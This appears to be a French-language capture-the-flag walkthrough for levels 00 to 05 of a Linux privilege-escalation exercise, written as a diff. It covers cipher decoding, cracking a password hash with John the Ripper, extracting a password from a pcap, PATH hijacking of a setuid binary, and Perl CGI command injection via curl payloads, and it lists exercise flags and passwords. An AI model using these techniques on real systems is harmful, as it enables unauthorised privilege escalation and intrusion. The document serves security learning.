@@ -1,0 +1,303 @@
+LEVEL 00 : 
+
+- ls : rien
+
+- ls -a : trois fichier mais rien de comprehensible dedans
+
+- ../../../ racine : Pleins de dossier.
+
+- grep -r "mot cle" : password, passwd, mdp, token, user : rien de concluant.
+
+- Balade dans les fichiers interressant a premiere vue.
+    usr/sbin : john ??
+        cat john : cdiiddwpgswtgt
+                    Message coder ?
+        grep -r "john"
+            deuxieme john identique dans rofs
+            plein d'addresse github 
+            Idee : faire une rotation code romain sur internet
+                rot15 : nottoohardhere
+            su flag00 : nottoohardhere
+            getglag : x24ti5gi3x0ol2eh4esiuxias
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+LEVEL 01:
+
+- ls : rien
+
+- ls -a : trois fichier mais rien de comprehensible dedans
+
+- Retour a la racine ~ ../../..
+
+- Balade dans les fichier : 
+                            john est toujours la avec son charabia
+                            decouverte dans /etc : fichier passwd et gpasswd
+                            cat passwd :  flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bashrm -rf
+                            flag01 : 42hDRfypTqqnw n'est pas le mdp.
+42hDRfypTqqnw ressemble a un mdp hasher, est ce que j'en ai besoin pour avoir acces a un user avec plus de droit ?
+
+-Rien trouve d'autre dans les fichiers avec : find / -user flag01 -perm -4000 2>/dev/null
+
+-Recherche d'acces a home : denied.
+
+-Tentative de copie de /home/flag/flag01: dans un fichier texte de /tmp (seul endroit ou j'ai visiblement des droits)
+    : denied. Toujours pas d'acces a home meme en copie.
+
+-Recherche sur internet de logiciel de decryptage -> Rien de concluant, pas de match.
+
+-John the reaper est un logiciel de decryptage !
+    Pas installer sur ma VM, je tente de l'installer :
+    Lociel payant, mais trouver gratuitement sur github.
+    Git clone ne fonctionne pas, je n'ai pas git d'installer sur ma VM.
+    Je ne peux pas l'installer, j'ai besoin du mdp de flag01.
+    Je sors de ma VM et installe John sur ma machine.
+        gcl https://github.com/openwall/john.git John
+        cd John
+        cd src
+
+        ./configure --disable-openmp &&
+        make -s clean && make -sj4 && mv ../run/john ../run/john-non-omp &&
+        ./configure CPPFLAGS='-DOMP_FALLBACK -DOMP_FALLBACK_BINARY="\"john-non-omp\""' &&
+        make -s clean && make -sj4 && echo All Done
+
+        cd ../run
+        echo 'flag01:42hDRfypTqqnw' > hash.txt
+        ./john --format=crypt hash.txt
+            -> abcdefg          (flag01)
+
+        su flag01 : abcdefg
+        getflag : f2av5il02puano7naaf6adaaf
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+LEVEL 02: 
+
+- ls : level02.pcap
+
+- cat level02.pcap : charabia mais dans le fichier il y a des mots interressant:
+
+                #SodaCan:0����'DISPLAYSodaCan:0����xterm��@f&N0�TT$EFԧ@@~;���;���/Y�O���o�����9
+
+                Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
+                wwwbugs login: @f&NV.B'̊$E4��@@J<;���;��ߙO/Y�t���
+
+                Password: Nf&NatB'̊$E4��@@J-;���;��ߙO/Y����%�s��
+
+                Login incorrect
+                wwwbugs login: df&N�%
+
+- Recherche de ce qu'est un .pcap : 
+        Un .pcap (Packet CAPture) est un fichier qui contient un enregistrement brut de trafic réseau, capturé sur une interface à un moment donné.
+        Contient:
+                  Chaque paquet réseau, dans l’ordre où il a été intercepté.
+                  Les en-têtes des protocoles (Ethernet, IP, TCP, UDP, HTTP, etc.).
+                  Éventuellement la donnée brute transmise (payload).
+                  Des horodatages précis (heure exacte de la capture).
+                  Des métadonnées liées à l’interface de capture.
+
+- Tentative de decryptage : tcpdump -r level02.pcap -> plein d'info brut, rien de precis
+
+- Lecture des paquet : strings level02.pcap -> bingo
+
+                SodaCan:0
+                DISPLAY
+                SodaCan:0
+
+                Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
+                wwwbugs login: @f&NV.
+
+                Password: Nf&Nat
+
+                Login incorrect
+                wwwbugs login: df&N
+
+- Su flag 02: Nf&Nat : Authentication failure -? je pense que c'est encoder, comme le login
+
+-J'ai taper Nf&Nat sur internet, j'ai trouver que dans Linux, nf_nat est un module du noyau (kernel) pour la traduction d’adresses réseau (NAT – Network Address Translation).
+        Il gère comment les paquets IP sont modifiés pour passer d’un réseau à un autre. -> 10.1.1.2 ?
+
+- Su flag 02: SodaCan -> non, piege ?
+
+-Recherche sur les paquets et leurs lecture -> Wireshark est un analyseur de paquet gratuit.
+
+-Recuperation de level02.pcap hors de ma vm : 
+                                              cp /home/user/level02/level02.pcap /tmp/  -> copie le fichier dans mon tmp
+                                              chmod 644 /tmp/level02.pcap -> rend le fichier copiable par n’importe qui sans donner plus de droits que nécessaire.
+
+                                              scp -P 4243 level01@127.0.0.1:/tmp/level02.pcap .  -> Dans ma machine pour recuperer level02.pcap
+
+- Lecture dans Wireshark : Rien de visible a premiere vue ?
+
+- Le mot password apparait -> Toute ligne d'apres font 1 byte, abant non, si je met tout les caractere a la suite : f t _ w a n d r . . . N D R e l . L 0 L
+
+- ft_wandr...DRel.L0L -> pas le mot de passe, mais suspect, il doit y avoir des lettres en trop ? 
+
+- Les '.' ne sont pas des points, ligne fini par '7f' -> man ascii -> 127 -> DEL : a supprimer ?
+
+- ft_wandrDRelL0L -> pas le mot de passe, autre chose a enlever ? 
+
+- Apres le 'L0L' il y a 0d -> 13 -> /r -> retour chariot, white space a supprimer aussi, fin de mdp ? 
+
+- f t _ w a n d r 127 127 127 N D R e l 127 L 0 L 13  = ft_wandrNDRelL0L -> pas le mot de passe, les DEL veulent surement dire de supprimer avant ou apres, ndr / NDR est en double
+
+- ft_wandrel0L -> non  
+
+    su flag : ft_waNDReL0L
+
+    getflag : kooda2puivaav1idi4f57q8iq
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+LEVEL03
+
+- ls -l : total 12     -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03  -> s à la place du x pour user et pour group -> le programme s’exécute avec les droits du propriétaire ou du groupe (flag03)
+
+- cat level03 : charabia mais dans le fichier il y a un truc interressant:
+
+                            /usr/bin/env echo Exploit me
+
+env sert à exécuter un programme en utilisant la variable d’environnement $PATH pour savoir où le trouver.
+
+Il va chercher echo dans l’ordre des dossiers listés dans $PATH.
+
+Si on met un faux echo dans un dossier qui apparaît en premier dans $PATH, c’est ce faux programme qui sera exécuté à la place du vrai /bin/echo.
+
+    On place notre propre script nommé echo dans un dossier qui apparaît avant /bin dans $PATH, c’est notre script qui sera exécuté, pas le vrai /bin/echo
+    On crée un faux echo qui exécute /bin/sh (ou /bin/bash) pour ouvrir un shell.
+    On donne les permissions d’exécution (chmod +x).
+
+        echo '/bin/sh' > /tmp/echo
+        chmod +x /tmp/echo
+
+
+    On met son dossier (/tmp) en tête du $PATH (export PATH=/tmp:$PATH).
+
+        export PATH=/tmp:$PATH
+
+    Quand le programme appelle env echo, il tombe sur notre script et nous donne un shell avec les droits du programme (flag03).
+
+-cd ~  -> ./level03
+
+- getflag dans le shell : qi0maab88jeaj46qoumi7maus
+
+- exit ->  su level04 : qi0maab88jeaj46qoumi7maus
+-----------------------------------------------------------------------------------------------------------------------
+
+LEVEL04
+
+- ls -l total 4  -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+-Recherche .pl ->  Perl Language
+    Langage de programmation créé dans les années 80, très utilisé pour le traitement de texte, les scripts systèmes, l’administration réseau, etc.
+    Les fichiers .pl sont du texte contenant du code, et ils s’exécutent avec l’interpréteur "perl ./exectuable"
+
+- perl ./level04  : Content-type: text/html
+
+- cat level04 : 
+                #!/usr/bin/perl
+                # localhost:4747
+                use CGI qw{param};
+                print "Content-type: text/html\n\n";
+                sub x {
+                $y = $_[0];
+                print `echo $y 2>&1`;
+                }
+                x(param("x"));
+
+
+
+- Decomposons ce code : 
+
+                 #!/usr/bin/perl  -> le script doit être exécuté avec l’interpréteur Perl
+
+                # localhost:4747 -> peut-être où le serveur CGI écoute
+
+                use CGI qw{param}; -> Charge le module CGI pour récupérer les paramètres passés via l’URL ou un formulaire
+
+                print "Content-type: text/html\n\n"; -> En-tête HTTP obligatoire pour un script CGI, indique que la sortie sera du HTML
+
+                sub x {               |        Définit une fonction x qui :
+                $y = $_[0];           |  ->    récupère son argument dans $y ($_[0])
+                print `echo $y 2>&1`; |        exécute la commande shell echo $y et affiche le résultat dans la page web
+                }                     |           (2>&1 redirige aussi les erreurs)
+
+                x(param("x")); ->  Appelle la fonction x avec le paramètre x passé dans l’URL ou le formulaire.
+
+
+- Idee : visiblement il n’y a aucune validation de l’entrée ? 
+
+                $x = param("x");    -> Récupère le paramètre x de l'URL
+                print `echo $x 2>&1`;  -> Exécute $x dans un backtick (commande shell)
+
+        Donc tout ce qui est passé dans x est exécuté par le shell sans aucune validation. 
+
+- Test : Le script Perl est un serveur web CGI, donc il s’attend à recevoir la requête via HTTP
+
+                curl "http://localhost:4747/?x=;cat%20/home/flag/flag04"   
+                echo ;home/flag/flag04 2>&1
+
+                -> Permission denied
+
+- J'ai mal ecrit : pour injecter en html 'space' -> %20 et ' -> %60
+
+        curl "http://localhost:4747/?x=%60ls%20-l%20/home/flag/flag04%60"    (ls -l /home/flag/flag04)
+        -> total 4 -r-x------ 1 flag04 flag04 33 Aug 30 2015 README.txt
+
+J'ai un readme dans flag04 : 
+
+        curl "http://localhost:4747/?x=%60cat%20/home/flag/flag04/README.txt%60"
+        -> Don't forget to launch getflag !
+-  getflag :
+Check flag.Here is your token : 
+Nope there is no token here for you sorry. Try again
+
+- Le readme contient "Don't forget to launch getflag !" -> j'ai juste lu dedand, je n'ai toujours pas les autorisations
+
+- Je passe encore par curl pour essayer d'executer getflag directement: 
+
+            curl "http://localhost:4747/?x=%60getflag%60"  (./getflag)
+            -> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+Donc $y contient `getflag`.
+
+Les backticks (')autour de $y font exécuter getflag.
+
+echo $y affiche la sortie de getflag.
+
+2>&1 redirige les erreurs vers la sortie standard pour que tout soit imprimé.
+
+
+- su level05 : ne2searoevaevoem4ov4ar8ap
+
+--------------------------------------------------------------------------------
+
+LEVEL05
+
+- ls -l : vide
+
+-Balade dans les dossiers racine :
+    bin : rien de bizarre
+    etc : rien de bizarre
+    sbin : peut etre mount.ecryptfs_private ?
+    usr/sbin : ls -l : -rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
+
+- cat openarenaserver 
+    #!/bin/sh
+
+    for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+    done
+
+
+
+
+
+
+
+
+
+
+
+
